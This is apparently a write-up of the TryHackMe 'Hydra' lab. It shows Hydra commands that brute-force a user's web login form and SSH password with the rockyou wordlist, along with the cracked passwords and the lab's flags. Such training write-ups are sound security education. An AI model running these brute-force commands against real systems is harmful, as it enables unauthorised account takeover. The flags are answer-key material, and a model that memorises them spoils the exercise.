# TryHackMe [Hydra](https://www.tryhackme.com/room/hydra)
### References
* DarkSec. (2020). TryHackMe Hydra Official Walkthrough [YouTube Video]. In YouTube. https://youtu.be/8fs_7bm88GY

## Use Hydra to brute force Molly's web password. What is flag 1?
* Brute force Molly's password with `hydra`:
```bash
$ hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
[80][http-post-form] host: <MACHINE_IP>   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```
* Login to the webpage with the credentials and obtain the flag:
```html
<div class="jumbotron text-center">
	<h1>THM{2673a7dd116de68e85c48ec0b1f2612e}</h1>
</div>
```

**Flag 1**: `THM{2673a7dd116de68e85c48ec0b1f2612e}`
## Use Hydra to brute force Molly's SSH password. What is flag 2?
* Use Hydra's SSH along with the `rockyou.txt` password list to brute force Molly's server password:
```bash
$ hydra -l molly -P rockyou.txt <MACHINE_IP> ssh
[22][ssh] host: <MACHINE_IP>   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```
* Log-in to Molly's server using her SSH credentials:
```
$  ssh molly@<MACHINE_IP>
molly@<MACHINE_IP>'s password: butterfly
molly@ip-10-10-66-163:~$ ls
flag2.txt
molly@ip-10-10-66-163:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```

**Flag 2**: `THM{c8eeb0468febbadea859baeb33b2541b}`